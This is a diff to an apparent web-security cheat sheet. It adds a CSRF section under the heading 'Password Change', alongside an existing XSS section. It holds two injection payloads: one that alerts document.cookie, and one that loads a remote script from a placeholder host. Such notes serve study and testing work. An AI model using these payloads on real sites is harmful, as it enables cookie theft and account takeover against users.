@@ -7,6 +7,7 @@ Overview
 3. - [Sensitive Data Exposure](#3---sensitive-data-exposure)
 4. - [HTML Injection](#4---html-injection)
 5. - [Cross-Site Scripting (XSS)](#5---cross-site-scripting-xss)
+6. - [Cross-Site Request Forgery (CSRF)](#6---cross-site-request-forgery-csrf)
 
    
 #1. - Web Requests
@@ -94,4 +95,13 @@ CTRL + U
 
 ```
 #"><img src=/ onerror=alert(document.cookie)>
+```
+
+#6. - Cross-Site Request Forgery (CSRF)
+-----------------------------------------
+
+- Password Change
+
+```
+"><script src=//www.example.com/exploit.js></script>
 ```
